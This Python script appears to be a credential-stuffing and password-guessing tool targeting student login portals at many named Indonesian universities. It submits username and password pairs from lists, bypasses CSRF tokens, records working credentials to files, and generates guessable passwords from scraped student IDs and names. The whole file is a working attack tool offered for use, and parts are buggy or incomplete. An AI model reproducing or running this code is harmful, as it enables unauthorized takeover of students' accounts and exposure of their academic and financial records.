import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import lock
import multiprocessing
from multiprocessing.pool import ThreadPool
import os, time, random, platform, hashlib, sys, urllib.parse, requests.packages.urllib3
import os, time, platform, requests as req, requests.packages.urllib3
try:
	import requests as req
	from bs4 import BeautifulSoup as bs
except:
	os.system('pip install --upgrade pip')
	os.system('pip install requests bs4')
	os.system('clear')
	exit('Install bahan selesai\nSilahkan restart script')
else:
	grey = '\x1b[90m'
	red = '\x1b[91m'
	green = '\x1b[92m'
	yellow = '\x1b[93m'
	blue = '\x1b[94m'
	purple = '\x1b[95m'
	cyan = '\x1b[96m'
	white = '\x1b[37m'
	flag = '\x1b[47;30m'
	off = '\x1b[m'
	rv = platform.uname()
	me = rv.release
	ok = []
	no = []
	result = []
	found = []
	error = []
	xtc = []
	
	logo = f'''
{green}__  __                   _____           _
\ \/ /__ _ _ __  ___    |_   _|__   ___ | |___
 \  // _` | '_ \/ __|{blue}_____{green}| |/ _ \ / _ \| / __|
 /  \ (_| | | | \__ \{blue}_____{green}| | (_) | (_) | \__ \

/_/\_\__,_|_| |_|___/     |_|\___/ \___/|_|___/{off}
'''
	os.system('clear')
	
	def untan(i, usr, pwd):
		url = 'http://mahasiswa.siakad.untan.ac.id/login'
		dat = {'nim':usr,  'password':pwd, 
		'submit':'submit'}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		sta = bs(raw, 'html.parser').title.get_text()
		if sta == 'SIAKAD MAHASISWA | Universitas Tanjungpura':
			print(f"{green}[{yellow}found{green}]{yellow}{usr}{white}:{green}{pwd}")
			found.append(f"{usr}:{pwd}")
			with open('Hasil_UNTAN.txt', 'a') as (save):
				save.write(f"{usr}:{pwd}\n")
		else:
			print(f"{red}[{white}eror{red}] {red}{usr}{white}:{red}{pwd}")
			error.append(f"{usr}:{pwd}")
	
	def uad(usr, pwd):
		url = 'https://portal.uad.ac.id/login'
		dat = {'username':usr,  'password':pwd 
		}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		res = bs(raw, 'html.parser').title.get_text()
		if res == 'Portal Mahasiswa UAD (Universitas Ahmad Dahlan)':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			ok.append(f"{usr}:{pwd}")
			with open('Hasil_UAD.txt', 'a') as (s):
				s.write(f"{usr}:{pwd}\n")
		else:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			no.append(f"{usr}:{pwd}")
	
	
	def unhas(nim,pwd):
		ses = req.Session()
		url = 'https://ewali.unhas.ac.id/'
		raw = ses.get(url).text
		tok = bs(raw, 'html.parser').findAll('input')[0]['value']
		dat = {'_token':tok,
		'username':nim,
		'password':pwd,
		'login':'submit'}
		ses.post(url, data=dat).text
		row = ses.get('https://ewali.unhas.ac.id/nilaimk').text
		try:
			nama = bs(row, 'html.parser').find('tbody').findAll('td')[1].get_text()
			print(f"{off}[{red}found{off}] {green}{nim}{off}:{green}{pwd}")
			sukses.append(nim,pwd)
			with open('Hasil_UNHAS.txt', 'a') as save:
				save.write(f"> {nim} - {pwd}\n")
		except:
			print(f"{off}[{red}error{off}] {red}{nim}{off}:{red}{pwd}")
	
	def ipb(usr, pwd):
		try:
			url = 'https://simak.ipb.ac.id/Account/Login'
			ses = req.Session()
			row = ses.get(url).text
			tok = bs(row, 'html.parser').findAll('input')[0]['value']
			dat = {'__RequestVerificationToken':tok, 
			'UserName':usr, 
			'Password':pwd}
			raw = ses.post(url, data=dat).text
			try:
				her = bs(raw, 'html.parser').findAll('span')[6].get_text()
				print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
				found.append(f"{usr}:{pwd}")
				with open('Hasil_IPB.txt', 'a') as (save):
					save.write(f"{usr}:{pwd}\n")
				done()
					
			except IndexError:
				print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
				error.append(f"{usr}:{pwd}")
		except KeyboardInterrupt:
			exit()
          
	def uii(i, usr, pwd):
		url = 'https://tagihan.uii.ac.id/index.php/login'
		dat = {'uname':usr,  'passwd':pwd, 
		'submit':'submit'}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		sta = bs(raw, 'html.parser').title.get_text()
		if sta == 'Tagihan UII':
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			error.append(f"{usr}:{pwd}")	  
		else:
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			found.append(f"{usr}:{pwd}")
			with open('Hasil_UII.txt', 'a') as (save):
				save.write(f"{usr}:{pwd}\n")
			
	def cek(usr, pwd):
		try:
			url = 'https://sso.ugm.ac.id/cas/login?service=http%3A%2F%2Fsimaster.ugm.ac.id%2Fugmfw%2Fsignin_simaster%2Fsignin_proses'
			ses = req.Session()
			row = ses.get(url).text

			tok = bs(row, 'html.parser').findAll('input')[4]['value']

			tok1 = bs(row, 'html.parser').findAll('input')[5]['value']
			dat = {'username':usr,
'password':pwd, 'lt':tok, '_eventId':tok1, 'submit':'MASUK'}
			raw = ses.post(url, data=dat).text

			try:
				her = bs(raw, 'html.parser').findAll('noscript')[0].get_text()
				print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
				found.append(f"{usr}:{pwd}")
				with open('Hasil_UGM.txt', 'a') as (save):
					save.write(f"{usr}:{pwd}\n")
			except IndexError:
				print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
				error.append(f"{usr}:{pwd}")

		except KeyboardInterrupt:
			exit()
			
			
	def ui(usr, pwd):
		url = 'https://academic.ui.ac.id/main/Authentication/Index'
		dat = {'u':usr, 'p':pwd}
		raw = req.post(url, data=dat).text
		res = bs(raw, 'html.parser').findAll('p')[0].text
		if res == 'Please wait, redirecting...':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			ok.append(f"{usr}:{pwd}")
			with open('Hasil_UI.txt', 'a') as (s):
				s.write(f"{usr}:{pwd}\n")
		else:
			if res == 'Login Failed':
				print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			else:
				print(f"{white}  ->{yellow} {usr}{white}:{yellow}{pwd}")
			
	def done():
		exit()	   
			
			
	def uajy(usr, pwd):
		try:
			url = 'https://siatma.uajy.ac.id/Index.aspx'
			ses = req.Session()
			row = ses.get(url).text

			tok = bs(row, 'html.parser').findAll('input')[0]['value']

			vs1 = bs(row, 'html.parser').findAll('input')[1]['value']

			vs2 = bs(row, 'html.parser').findAll('input')[2]['value']
			dat = {'__VIEWSTATE':tok, '__VIEWSTATEGENERATOR':vs1, '__EVENTVALIDATION':vs2,
			 'txtUsername':usr,
'txtPassword':pwd,
'btnLogin':'submit'}
			raw = ses.post(url, data=dat).text
			try:
				her = bs(raw, 'html.parser').findAll('span')[6].get_text()
				print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
				found.append(f"{usr}:{pwd}")
				with open('Hasil_UAJY.txt', 'a') as (save):
					save.write(f"{usr}:{pwd}\n")
			except IndexError:
				print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
				error.append(f"{usr}:{pwd}")

		except KeyboardInterrupt:
			exit()
			
	def ub(usr, pwd):
		url = 'https://siam.ub.ac.id/'
		dat = {'username':usr,  'password':pwd, 
		 'login':'submit'}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		res = bs(raw, 'html.parser').title.get_text()
		if res == 'Sistem Informasi Akademik Mahasiswa':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			ok.append(f"{usr}:{pwd}")
			with open('Hasil_UB.txt', 'a') as (s):
				s.write(f"{usr}:{pwd}\n")
		else:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			no.append(f"{usr}:{pwd}")
			
	def unusa(i, usr, pwd):
		url = 'https://sim.unusa.ac.id/front/gate/index.php'
		dat = {'txtUserID':usr,  'txtPassword':pwd, 
		 'submit':'submit'}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		sta = bs(raw, 'html.parser').title.get_text()
		if sta == 'Kuesioner':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			found.append(f"{usr}:{pwd}")
			with open('Hasil_UNUSA.txt', 'a') as (save):
			 save.write(f"{usr}:{pwd}\n")
		else:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			error.append(f"{usr}:{pwd}")
			
	def usd(i, usr, pwd):
		url = 'https://belajar.usd.ac.id/login/index.php'
		dat = {'username':usr,  'password':pwd, 
		 'submit':'submit'}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		sta = bs(raw, 'html.parser').title.get_text()
		if sta == 'Dashboard':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			found.append(f"{usr}:{pwd}")
			with open('Hasil_USD.txt', 'a') as (save):
			 save.write(f"{usr}:{pwd}\n")
		else:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			error.append(f"{usr}:{pwd}")
			
	def unsrat(usr, pwd):
		try:
			url = 'https://inspire.unsrat.ac.id/login/autentikasi'
			ses = req.Session()
			row = ses.get(url).text
			dat = {'username':usr,
'password':pwd}
			raw = ses.post(url, data=dat).text
			try:
				her = bs(raw, 'html.parser').findAll('small')[1].get_text()
				print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
				found.append(f"{usr}:{pwd}")
				with open('Hasil_UNSRAT.txt', 'a') as (save):
					save.write(f"{usr}:{pwd}\n")
			except IndexError:
				print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
				error.append(f"{usr}:{pwd}")

		except KeyboardInterrupt:
			exit()
			
			
	def unsyiahp():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					data = line.strip()
					user = data.split(':')[0]
					pswd = data.split(':')[1]
					if len(data) > 0:
						unsyiah(count, user, pswd)
						count += 1
						continue

			done()

		except KeyboardInterrupt:
			exit(f"\n{red}>> {white}Keluar script")
		except FileNotFoundError:
			exit(f"{red}>> {white}File tidak ditemukan")
		except IndexError:
			exit(f"{red}>> {white}Maaf format dalam file salah")
		except Exception as e:
			try:
				print(f"\n{red}>> {white}Error:(")
			finally:
				e = None
				del e


	def unsyiah(i, usr, pwd):
		url = 'https://simkuliah.unsyiah.ac.id/index.php/login'
		dat = {'username':usr,  'password':pwd, 
		'submit':'submit'}
		raw = req.post(url, data=dat, verify=False, timeout=10).text
		sta = bs(raw, 'html.parser').h5.get_text()
		if sta == 'Absenkan Mahasiswa':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			found.append(f"{usr}:{pwd}")
			with open('Hasil_UNSYIAH.txt', 'a') as (save):
				save.write(f"{usr}:{pwd}\n")
		else:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			error.append(f"{usr}:{pwd}")
			
	def upi(i, usr, pwd):
		ses = req.Session()
		ses = req.Session()
		url = 'https://sso.upi.edu/cas/login'
		raw = ses.get(url).text
		tok = bs(raw, 'html.parser').findAll('input')[2]['value']
		dat = {'username':usr,  'password':pwd, 
		 'execution':tok, 
		 '_eventId':'submit', 
		 'submit':'LOGIN'}
		gas = ses.post(url, data=dat).text
		res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
		if res == 'success':
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			found.append(i)
			with open('Hasil_UPI.txt', 'a') as (s):
				s.write(f"{usr}:{pwd}\n")
		else:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			error.append(i)
			
			
			

	def ipbp():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					ipb(usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as er:
			try:
				exit(f"\n{white} {{!}} {er}")
			finally:
				er = None
				del er
				
	def uiip():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					data = line.strip()
					user = data.split(':')[0]
					pswd = data.split(':')[1]
					if len(data) > 0:
						uii(count, user, pswd)
						count += 1
						continue

			done()

		except KeyboardInterrupt:
			exit(f"\n{red}>> {white}Keluar script")
		except FileNotFoundError:
			exit(f"{red}>> {white}File tidak ditemukan")
		except IndexError:
			exit(f"{red}>> {white}Maaf format dalam file salah")
		except Exception as e:
			try:
				print(f"\n{red}>> {white}Error:(")
			finally:
				e = None
				del e
				
	def ugmp():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (file):
				lines = file.readlines()
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					user = line.strip().split(':')[0]
					pswd = line.strip().split(':')[1]
					cek(user, pswd)
				else:
					print(f"\n{cyan}>> {white}[{green}Live:{len(found)}{white}] {purple}|{white} [{red}die:{len(error)}{white}]")
					print(f"{purple}>>{white} Akun aktif tersimpan di {purple}Hasil_UGM.txt{off}")
					
					exit()

		except IndexError:
			exit(f"{white}[{red}!{white}]{white}Input Salah")
		except FileNotFoundError:
			exit(f"{white}[{red}!{white}]{white}File tidak ditemukan")
		except KeyboardInterrupt:
			pass
			
	def unusap():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					data = line.strip()
					user = data.split(':')[0]
					pswd = data.split(':')[1]
					if len(data) > 0:
						unusa(count, user, pswd)
						count += 1
						continue

			done()

		except KeyboardInterrupt:
			exit(f"\n{red}>> {white}Keluar script")
		except FileNotFoundError:
			exit(f"{red}>> {white}File tidak ditemukan")
		except IndexError:
			exit(f"{red}>> {white}Maaf format dalam file salah")
		except Exception as e:
			try:
				print(f"\n{red}>> {white}Error:(")
			finally:
				e = None
				del e
				
	def usdp():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					data = line.strip()
					user = data.split(':')[0]
					pswd = data.split(':')[1]
					if len(data) > 0:
						usd(count, user, pswd)
						count += 1
						continue

			done()

		except KeyboardInterrupt:
			exit(f"\n{red}>> {white}Keluar script")
		except FileNotFoundError:
			exit(f"{red}>> {white}File tidak ditemukan")
		except IndexError:
			exit(f"{red}>> {white}Maaf format dalam file salah")
		except Exception as e:
			try:
				print(f"\n{red}>> {white}Error:(")
			finally:
				e = None
				del e
				
	def unsratp():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (file):
				lines = file.readlines()
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					user = line.strip().split(':')[0]
					pswd = line.strip().split(':')[1]
					unsrat(user, pswd)
				else:
					done()

		except IndexError:
			exit(f"  {white}[{red}!{white}]{white} Input Salah")
		except FileNotFoundError:
			exit(f"  {white}[{red}!{white}]{white} File tidak ditemukan")
		except KeyboardInterrupt:
			pass
			
	def uajyp():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (file):
				lines = file.readlines()
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					user = line.strip().split(':')[0]
					pswd = line.strip().split(':')[1]
					uajy(user, pswd)
				else:
					done()

		except IndexError:
			exit(f"  {white}[{red}!{white}]{white} Input Salah")
		except FileNotFoundError:
			exit(f"  {white}[{red}!{white}]{white} File tidak ditemukan")
		except KeyboardInterrupt:
			pass
			
	def upip():
		try:
			path = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(path, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					data = line.strip()
					user = data.split(':')[0]
					pswd = data.split(':')[1]
					if len(data) > 0:
						upi(count, user, pswd)
						count += 1
						continue

			done()

		except KeyboardInterrupt:
			exit(f"\n{red}>> {white}Keluar script")
		except FileNotFoundError:
			exit(f"{red}>> {white}File tidak ditemukan")
		except IndexError:
			exit(f"{red}>> {white}Maaf format dalam file salah")
		except Exception as e:
			try:
				print(f"\n{red}>> {white}Error:(")
			finally:
				e = None
				del e
				
	def itb(i, usr, pwd):
		ses = req.Session()
		url = 'https://login.itb.ac.id/cas/login'
		raw = ses.get(url).text
		tok = bs(raw, 'html.parser').findAll('input')
		dat = {'username':usr,  'password':pwd, 
		 'execution':tok[2]['value'], 
		 '_eventId':'submit',
		 'submit':'submit'}
		res = ses.post(url, data=dat).headers
		try:
			mantap = res['Set-Cookie']
			print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
			time.sleep(0.001)
			ok.append(f"{usr}:{pwd}")
			with open('Hasil_ITB.txt', 'a') as (s):
				s.write(f"{usr}:{pwd}\n")
		except KeyError:
			print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
			time.sleep(0.001)
			
	def uip():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					ui(usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as eru:
			try:
				exit(f"\n{white} {{!}} {er}")
			finally:
				eru = None
				del eru
	def unhasp():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					unhas(usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as eru:
			try:
				exit(f"\n{white} {{!}} {er}")
			finally:
				eru = None
				del eru
	
	def uadp():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					uad(usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as eur:
			try:
				exit(f"\n{white} {{!}} {er}")
			finally:
				eur = None
				del eur

	def ubp():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					ub(usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as erq:
			try:
				exit(f"\n{white} {{!}} {er}")
			finally:
				erq = None
				del erq
				
	def itbp():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					itb(count, usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as uio:
			try:
				exit(f"\n{white} {{!}} {uio}")
			finally:
				uio = None
				del uio
			
	def untanp():
		try:
			file = input(f"{green}[{yellow}+{green}] {white}Input list > ")
			with open(file, 'r') as (f):
				lines = f.readlines()
				count = 1
				print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
				for line in lines:
					usr = line.strip().split(':')[0]
					pwd = line.strip().split(':')[1]
					untan(count, usr, pwd)
					count += 1

			done()
		except KeyboardInterrupt:
			exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
		except Exception as yu:
			try:
				exit(f"\n{white} {{!}} {yu}")
			finally:
				yu = None
				del yu

	def done():
		print(f"\n{cyan}>> {white}[{green}Live:{len(found)}{white}] {purple}|{white} [{red}die:{len(error)}{white}]")
		print(f"{purple}>>{white} Akun aktif tersimpan")
		print(f"{green}[{cyan}?{green}] {off}Scan lagi? y/n")
		inv = input(f"{green}> {off}Pilih : ")
		if inv == 'y':
			os.system('clear')
			main()
		else:
			exit()
			
			
	
def asu():
	print(f"{green}[{white}A{green}]{white}Nim:nim {off}: ")
	print(f"{green}[{white}B{green}]{white}Nim:nama + Angka {off}: ")
	print(f"{green}[{white}C{green}]{white}Nim:Nama + Angka {off}: ")
	print(f"{green}[{white}D{green}]{white}Nim:Nama [1-6] {off}: ")
	print(f"{green}[{white}E{green}]{white}Nim:nama [1-6] {off}: ")
	print(f"{green}[{white}F{green}]{white}Nama.nama:Nama + Angka {off}: ")
	print(f"{green}[{white}F{green}]{white}Namapanjanng:Nama + Angka {off}: ")
	_0 = input(f"{green}[{white}?{green}]{white}Pilih > ")
	_1 = cut(input(f"{green}[{white}+{green}]{green}Input Link {off}> "))
	print(f"{red}𝘎𝘢𝘬 𝘶𝘴𝘢𝘩 𝘥𝘪 𝘪𝘴𝘪 𝘨𝘱𝘱{off}")
	cok = input(f"{green}[{yellow}+{green}]{off}Masukan ekor angka : ")
	_2 = input(f"{off}[{green}+{off}]{off}Nama Output {green}[{off}nama+.txt{green}] {off}: ")
	_3 = stat(_1)
	if _0 == 'A':
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(__+':'+x[0].lower()+cok+'\n')
					#o_.write(__+':'+x[1].lower()+cok+'\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					o_.write(__+':'+__+'\n')
			except:
				pass
		done(_2)
		
	elif _0 == 'B':
		
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].lower()+cok+'\n')
					o_.write(__+':'+x[1].lower()+cok+'\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == 'C':
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].title()+cok+'\n')
					o_.write(__+':'+x[1].title()+cok+'\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
		
	elif _0 == 'D':
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].title()+'1\n')
					o_.write(__+':'+x[0].title()+'12\n')
					o_.write(__+':'+x[0].title()+'123\n')
					o_.write(__+':'+x[0].title()+'1234\n')
					o_.write(__+':'+x[0].title()+'12345\n')
					o_.write(__+':'+x[0].title()+'123456\n')
					o_.write(__+':'+x[1].title()+'1\n')
					o_.write(__+':'+x[1].title()+'12\n')
					o_.write(__+':'+x[1].title()+'123\n')
					o_.write(__+':'+x[1].title()+'1234\n')
					o_.write(__+':'+x[1].title()+'12345\n')
					o_.write(__+':'+x[1].title()+'123456\n')
					o_.write(__+':'+x[2].title()+'1\n')
					o_.write(__+':'+x[2].title()+'12\n')
					o_.write(__+':'+x[2].title()+'123\n')
					o_.write(__+':'+x[2].title()+'1234\n')
					o_.write(__+':'+x[2].title()+'12345\n')
					o_.write(__+':'+x[2].title()+'123456\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == 'E':
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].lower()+'1\n')
					o_.write(__+':'+x[0].lower()+'12\n')
					o_.write(__+':'+x[0].lower()+'123\n')
					o_.write(__+':'+x[0].lower()+'1234\n')
					o_.write(__+':'+x[0].lower()+'12345\n')
					o_.write(__+':'+x[0].lower()+'123456\n')
					o_.write(__+':'+x[1].lower()+'1\n')
					o_.write(__+':'+x[1].lower()+'12\n')
					o_.write(__+':'+x[1].lower()+'123\n')
					o_.write(__+':'+x[1].lower()+'1234\n')
					o_.write(__+':'+x[1].lower()+'12345\n')
					o_.write(__+':'+x[1].lower()+'123456\n')
					o_.write(__+':'+x[2].lower()+'1\n')
					o_.write(__+':'+x[2].lower()+'12\n')
					o_.write(__+':'+x[2].lower()+'123\n')
					o_.write(__+':'+x[2].lower()+'1234\n')
					o_.write(__+':'+x[2].lower()+'12345\n')
					o_.write(__+':'+x[2].lower()+'123456\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
		
	elif _0 == 'F':
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+cok+'\n')
					o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+cok+'\n')
					o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[0].title()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[1].title()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[2].title()+cok+'\n')
					o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+cok+'\n')
					o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+cok+'\n')
					o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[0].lower()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[1].lower()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
	
	elif _0 == 'G':
		for _ in range(int(_3)):
			print(f"{blue}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(x[0].lower()+x[1].lower()+':'+x[0].title()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[1].title()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[2].title()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[0].lower()+cok+'\n')
